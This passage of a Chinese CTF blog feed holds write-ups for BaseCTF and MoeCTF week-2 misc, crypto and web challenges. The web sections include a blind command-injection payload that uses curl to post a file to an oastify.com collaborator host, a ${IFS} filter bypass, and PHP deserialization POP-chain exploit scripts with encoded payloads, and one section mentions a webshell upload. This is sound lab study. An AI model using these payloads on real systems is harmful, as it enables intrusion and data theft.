http://j6qb1ixdl8li829ybr7wxkuzwq2hqbe0.oastify.com</span><br></pre></td></tr></table></figure><p>抓取结果如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823171025594.png" alt=""></p><blockquote><p>对于这类题还有个很简单的方法，直接将flag写进文件，然后路径读取就行</p></blockquote><blockquote><p>先测试一下能不能执行 cmd=1;sleep 4</p><p>发现反应了4秒，能执行</p><p>然后直接 cat /f* &gt; 1.txt</p><p>最后访问/1.txt路径就行</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF比赛week2-wp</title>
      <link href="/posts/bb6a7637.html"/>
      <url>/posts/bb6a7637.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="Misc">Misc</h2><h4 id="Week2-黑丝上的flag">[Week2] 黑丝上的flag</h4><p>考点：图片隐写</p><p>打开是一张嗨咝图。根据题目意思，flag应该在黑丝上。放进StegSolve看看，找到了flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823125446281.png" alt="image-20240823125446281"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823121833011.png" alt="image-20240823121833011"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823122015855.png" alt="image-20240823122015855"></p><h4 id="Week2-Base">[Week2] Base?!</h4><p>考点：简单的base</p><p>下载附件打开，解码出现flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823125548236.png" alt="image-20240823125548236"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823125624311.png" alt="image-20240823125624311"></p><h4 id="Week2-海上又遇了鲨鱼">[Week2] 海上又遇了鲨鱼</h4><p>考点：流量分析</p><p>将附件用wireshark打开，发现了关键词flag.zip。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823125804797.png" alt="image-20240823125804797"></p><p>追踪流查看，发现有个登录的password，估计需要，先记下来</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823130203939.png" alt="image-20240823130203939"></p><p>将此文件提取下载出来，解压，密码就是上面的password，找到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823130057568.png" alt="image-20240823130057568"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823130127445.png" alt="image-20240823130127445"></p><h4 id="Week2-Aura-酱的旅行日记-I-图寻擂台">[Week2] Aura 酱的旅行日记 I &lt;图寻擂台&gt;</h4><p>考点：图片查地址</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823132107042.png" alt="image-20240823132107042"></p><p>搜索关键词-恐龙化石，博物馆。找到相似的图。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823132200529.png" alt="image-20240823132200529"></p><p>找到地址信息，就是flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823132300257.png" alt="image-20240823132300257"></p><h4 id="Week2-前辈什么的最喜欢了">[Week2] 前辈什么的最喜欢了</h4><p>考点：base64</p><p>下载附件，一大串vase64编码，解码找到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823133444346.png" alt="image-20240823133444346"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823133312396.png" alt="image-20240823133312396"></p><h4 id="Week2-Aura-酱的旅行日记-III-图寻擂台">[Week2] Aura 酱的旅行日记 III &lt;图寻擂台&gt;</h4><p>考点：图片信息，查地址</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823175518325.png" alt="image-20240823175518325"></p><p>根据图片gps经纬度信息，算出经度纬度。</p><p>计算方式：原经纬度 = 度 + (分/60) + (秒/3600)<br>根据这张图片的经纬度，计算如下：（一般西经是加负号）</p><blockquote><p>纬度：29；40；18.4799999999957265；<br>经度：102；57；46.7.72200000000864861.</p><p>计算得到：</p><p>纬度 = 29.67179999999999881<br>经度 = 102.9521450000000024</p></blockquote><p>最后用地图找到大致位置，找一下附近的风景区，其名字就是flag。</p><h4 id="Week2-反方向的雪">[Week2] 反方向的雪</h4><p>考点：文件分离，二进制逆序，空白格隐写，压缩包密码破解</p><p>下载附件解压，发现是一张图片，扔进010editor发现末尾加了其他文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823191853055.png" alt="image-20240823191853055"></p><p>将这一部分提取出来，如何逆序，发现就是个zip文件（“反方向”的雪）</p><p>需要密码，下面有个提示，但是却不是这个地方的密码。（试了半天，果断放弃，扔进解压工具爆破）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823191636716.png" alt="image-20240823191636716"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823191728509.png" alt="image-20240823191728509"></p><p>爆破出密码，解压打开发现是空白格隐藏，用到SNOW工具。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823191602570.png" alt="image-20240823191602570"></p><p>上面提示的密码是SNOW工具这里用的。（反方向的“雪”）</p><p>拿到flag。完事儿~~</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823191542299.png" alt="image-20240823191542299"></p><h4 id="Week2-哇！珍德食泥鸭">[Week2] 哇！珍德食泥鸭</h4><p>考点：文件分离</p><p>下载附件，打开是我们坤坤的gif动图（滑稽）。</p><p>刚开始以为会在某张图里面有信息，结果找遍了都没发现。</p><p>丢尽010editor，发现了一个压缩包</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823235133035.png" alt="image-20240823235133035"></p><p>将压缩包提取出来。在其中一个网页文件发现了flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823235221031.png" alt="image-20240823235221031"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823235250738.png" alt="image-20240823235250738"></p><h4 id="Week2-Aura-酱的旅行日记-IV-图寻擂台">[Week2] Aura 酱的旅行日记 IV &lt;图寻擂台&gt;</h4><p>考点：图寻</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/F984938C3C836E3B0569FF4E8C089312.jpg" alt=""></p><p>根据图片信息，搜索关键词：二龙戏珠。然后对比图，发现地点在江苏省南京市秦淮区贡院街夫子庙景区，也是本题的flag。</p><h4 id="Week2-Aura-酱的旅行日记-V-图寻擂台">[Week2] Aura 酱的旅行日记 V &lt;图寻擂台&gt;</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/F40F7B9C041B4D13302E47B406B89BAA.png" alt=""></p><p>这位伟人的铜像照，很快联想到邓小平故居。其地址就是flag。</p><p>BaseCTF{四川省广安市广安区邓小平故里-邓小平铜像广场and邓小平故居陈列馆}</p><h4 id="Week2-Aura-酱的旅行日记-VI-图寻擂台">[Week2] Aura 酱的旅行日记 VI &lt;图寻擂台&gt;</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1CF189710CA1001AA55DD94338E5CF6A.png" alt=""></p><p>一所学校，看到关键词-迎泽。搜索一下，找到了一张相似图片，是太原市第五中学。</p><p>BaseCTF{山西省太原市迎泽区青年路49号太原市第五中学校-建校时间1906年}</p><h4 id="Week2-二维码1-街头小广告">[Week2] 二维码1-街头小广告</h4><p>考点：二维码残缺</p><p>补上一个角，先扫一下，发现打开了basectf官网。</p><p>放进QRsearch，查看信息，得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240909205627737.png" alt="image-20240909205627737"></p><h4 id="Week2-ez-crypto">[Week2] ez_crypto</h4><p>考点：base64换表，crypto</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qMfZzunurNTuAdfZxZfZxZrUx2v6x2i0C2u2ngrLyZbKzx0=</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240909210132585.png" alt="image-20240909210132585"></p><h2 id="web">web</h2><h4 id="Week2-一起吃豆豆">[Week2] 一起吃豆豆</h4><p>考点：控制台源码分析</p><p>打开时j5做的小游戏，直接查看脚本，找到控制游戏结束的位置，发现一串base64编码，解码得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823154153145.png" alt="image-20240823154153145"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823154132273.png" alt="image-20240823154132273"></p><h4 id="Week2-你听不到我的声音">[Week2] 你听不到我的声音</h4><p>考点：shell_exec()无回显函数（见笔记）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823170508632.png" alt="image-20240823170508632"></p><p>shell_exec()是函数执行命令，但是这个地方无法回显。</p><p>先将执行命令后的结果用一个文件保存，之后再读取这个文件就行了。</p><p>先传入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=cat /f* &gt; 2.txt</span><br></pre></td></tr></table></figure><p>再粘贴burp里Collaborator里获取的payload。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823170736727.png" alt="image-20240823170736727"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=curl -X POST -F xx=@2.txt http://n8w9fjwqhuqrvdodcvrfwstrui09o0poe.oastify.com</span><br></pre></td></tr></table></figure><p>之后提取到2.txt文件就能得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823171025594.png" alt="image-20240823171025594"></p><h4 id="Week2-RCEisamazingwithspace">[Week2] RCEisamazingwithspace</h4><p>考点：空白符号过滤</p><p>用${IFS}过滤空白符就行。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823181157674.png" alt="image-20240823181157674"></p><h4 id="Week2-ez-ser">[Week2] ez_ser</h4><p>考点：简单的反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class re&#123;</span><br><span class="line">    public $chu0;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        if(!isset($this-&gt;chu0))&#123;</span><br><span class="line">            return &quot;I can not believes!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;chu0-&gt;$nononono;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class web &#123;</span><br><span class="line">    public $kw;</span><br><span class="line">    public $dt;</span><br><span class="line"></span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        echo &quot;lalalla&quot;.$this-&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        echo &quot;ALL Done!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class pwn &#123;</span><br><span class="line">    public $dusk;</span><br><span class="line">    public $over;</span><br><span class="line"></span><br><span class="line">    public function __get($name) &#123;</span><br><span class="line">        if($this-&gt;dusk != &quot;gods&quot;)&#123;</span><br><span class="line">            echo &quot;什么，你竟敢不认可?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;over-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Misc &#123;</span><br><span class="line">    public $nothing;</span><br><span class="line">    public $flag;</span><br><span class="line"></span><br><span class="line">    public function getflag() &#123;</span><br><span class="line">        eval(&quot;system(&#x27;cat /flag&#x27;);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Crypto &#123;</span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        echo &quot;happy happy happy!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getflag() &#123;</span><br><span class="line">        echo &quot;you are over!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ser = $_GET[&#x27;ser&#x27;];</span><br><span class="line">unserialize($ser);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>分析一下，看到了__wakeup()函数，所以就使用它这条链了。</p><p>new web() -&gt; new re() -&gt; new pwn() -&gt; new Misc()</p><p>构造如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class re&#123;</span><br><span class="line">    public $chu0;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        if(!isset($this-&gt;chu0))&#123;</span><br><span class="line">            return &quot;I can not believes!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;chu0-&gt;$nonono;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class web &#123;</span><br><span class="line">    public $kw;</span><br><span class="line">    public $dt;</span><br><span class="line"></span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        echo &quot;lalalla&quot;.$this-&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        echo &quot;ALL Done!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class pwn &#123;</span><br><span class="line">    public $dusk;</span><br><span class="line">    public $over;</span><br><span class="line"></span><br><span class="line">    public function __get($name) &#123;</span><br><span class="line">        if($this-&gt;dusk != &quot;gods&quot;)&#123;</span><br><span class="line">            echo &quot;什么，你竟敢不认可?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;over-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Misc &#123;</span><br><span class="line">    public $nothing;</span><br><span class="line">    public $flag;</span><br><span class="line"></span><br><span class="line">    public function getflag() &#123;</span><br><span class="line">        eval(&quot;system(&#x27;cat /flag&#x27;);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Crypto &#123;</span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        echo &quot;happy happy happy!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getflag() &#123;</span><br><span class="line">        echo &quot;you are over!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">$a = new web();</span><br><span class="line">$a-&gt;kw = new re();</span><br><span class="line">$a-&gt;kw-&gt;chu0 = new pwn();</span><br><span class="line">$a-&gt;kw-&gt;chu0-&gt;dusk = &quot;gods&quot;;</span><br><span class="line">$a-&gt;kw-&gt;chu0-&gt;over = new Misc();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line">//O%3A3%3A%22web%22%3A2%3A%7Bs%3A2%3A%22kw%22%3BO%3A2%3A%22re%22%3A1%3A%7Bs%3A4%3A%22chu0%22%3BO%3A3%3A%22pwn%22%3A2%3A%7Bs%3A4%3A%22dusk%22%3Bs%3A4%3A%22gods%22%3Bs%3A4%3A%22over%22%3BO%3A4%3A%22Misc%22%3A2%3A%7Bs%3A7%3A%22nothing%22%3BN%3Bs%3A4%3A%22flag%22%3BN%3B%7D%7D%7Ds%3A2%3A%22dt%22%3BN%3B%7DALL Done!</span><br></pre></td></tr></table></figure><p>传进去得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823221539045.png" alt="image-20240823221539045"></p><h4 id="Week2-Really-EZ-POP">[Week2] Really EZ POP</h4><p>考点：pop链</p><p>源代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Sink</span><br><span class="line">&#123;</span><br><span class="line">    private $cmd = &#x27;echo 123;&#x27;;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Shark</span><br><span class="line">&#123;</span><br><span class="line">    private $word = &#x27;Hello, World!&#x27;;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;Shark says:&#x27; . $this-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Sea</span><br><span class="line">&#123;</span><br><span class="line">    public $animal;</span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $sea_ani = $this-&gt;animal;</span><br><span class="line">        echo &#x27;In a deep deep sea, there is a &#x27; . $sea_ani();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Nature</span><br><span class="line">&#123;</span><br><span class="line">    public $sea;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_POST[&#x27;nature&#x27;]) &#123;</span><br><span class="line">    $nature = unserialize($_POST[&#x27;nature&#x27;]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>看到了函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__destrust(),__invoke(),__toString()</span><br></pre></td></tr></table></figure><p>构造pop链：</p><p>nature -&gt; sea -&gt; Shark -&gt; Sink</p><p>由于私有属性问题，要在Shark类中构造个函数setWord()。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Sink</span><br><span class="line">&#123;</span><br><span class="line">    private $cmd = &#x27;system(&quot;cat /flag&quot;);&#x27;;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Shark</span><br><span class="line">&#123;</span><br><span class="line">    private $word = &#x27;Hello, World!&#x27;;</span><br><span class="line">public function setWord($word)</span><br><span class="line">&#123;</span><br><span class="line">$this-&gt;word = $word;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;Shark says:&#x27; . $this-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Sea</span><br><span class="line">&#123;</span><br><span class="line">    public $animal;</span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $sea_ani = $this-&gt;animal;</span><br><span class="line">        echo &#x27;In a deep deep sea, there is a &#x27; . $sea_ani();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Nature</span><br><span class="line">&#123;</span><br><span class="line">    public $sea;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">$a = new Nature();</span><br><span class="line">$a-&gt;sea = new Sea();</span><br><span class="line">$b = new Sink();</span><br><span class="line">$c = new Shark();</span><br><span class="line">$c-&gt;setWord($b);</span><br><span class="line">$a-&gt;sea-&gt;animal =$c;</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line">//O%3A6%3A%22Nature%22%3A1%3A%7Bs%3A3%3A%22sea%22%3BO%3A3%3A%22Sea%22%3A1%3A%7Bs%3A6%3A%22animal%22%3BO%3A5%3A%22Shark%22%3A1%3A%7Bs%3A11%3A%22%00Shark%00word%22%3BO%3A4%3A%22Sink%22%3A1%3A%7Bs%3A9%3A%22%00Sink%00cmd%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure><p>直接用hackerbar进行post传参无回显，那就bp抓包，在Body里的参数里的值进行重新复制就行。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240909213202742.png" alt="image-20240909213202742"></p><p>放行后得到flag回显</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240909213317991.png" alt="image-20240909213317991"></p><h4 id="Week2-数学大师">[Week2] 数学大师</h4><p>考点：python的requests库（见脚本）</p><p>每⼀道题⽬需要在 5 秒内解出, 传⼊到  $_POST[‘answer’]  中, 解出 50 道即可, 除法取整 。  考察使⽤ Python 的 requests 库写脚本，注意在请求时要开启 session cookie。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240909215036189.png" alt="image-20240909215036189"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Moectf-week2-wp</title>
      <link href="/posts/5cf8ea4.html"/>
      <url>/posts/5cf8ea4.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1>Misc</h1><h2 id="the-secret-of-snowball">the_secret_of_snowball</h2><p>考点：破损文件，010editor查看</p><p>打开文件，是张破损的jpg文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817133131744.png" alt="image-20240817133131744"></p><p>放进010editor，修改前缀。jpg文件前缀是FF D8 FF E1</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817133354097.png" alt="image-20240817133354097"></p><p>找到一半flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817133442469.png" alt="image-20240817133442469"></p><p>另一半去哪里了呢？在010editor末尾看到了一串特殊密码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817133535723.png" alt="image-20240817133535723"></p><p>进行解密得到另一半</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817133602024.png" alt="image-20240817133602024"></p><p>最后合在一起，就是完整的flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817133637981.png" alt="image-20240817133637981"></p><h2 id="每人至少300份">每人至少300份</h2><p>考点：二维码拼接</p><p>下载文件，是一堆分割的二维码，需要将二维码拼上，在进行扫描，就能看到信息。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817141836614.png" alt="image-20240817141836614"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817141851780.png" alt="image-20240817141851780"></p><p>扫出来后是一串字符。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e561ff9135302b887e6b64287561c26c.jpg" alt="img"></p><p>解码得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817142028581.png" alt="image-20240817142028581"></p><h2 id="解不完的压缩包">解不完的压缩包</h2><p>考点：压缩包套娃</p><p>下载文件，是压缩包套娃，999个压缩包重叠，没有密码，可以手动解压（雾）。</p><p>python脚本更快。（见脚本笔记）</p><p>解压完后最后一个压缩包里面有加密文件和flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817152112946.png" alt="image-20240817152112946"></p><p>前四个压缩大小和原始大小一样，考虑使用ZipCracker工具的CRC32碰撞提取内容，得到flag.txt的密码，最后得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817152300961.png" alt="image-20240817152300961"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817152342829.png" alt="image-20240817152342829"></p><h1>web</h1><h2 id="垫刀之路01-MoeCTF？启动！">垫刀之路01: MoeCTF？启动！</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240818224107906.png" alt="image-20240818224107906"></p><p>先直接查看flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240818224221189.png" alt="image-20240818224221189"></p><p>查看环境变量，执行set命令。出flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240818224311183.png" alt="image-20240818224311183"></p><h2 id="垫刀之路02-普通的文件上传">垫刀之路02: 普通的文件上传</h2><p>考点：文件上传漏洞</p><p>随便上传一个一句话木马，用bp抓包将jpg修改成php。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240818225624354.png" alt="image-20240818225624354"></p><p>记下位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 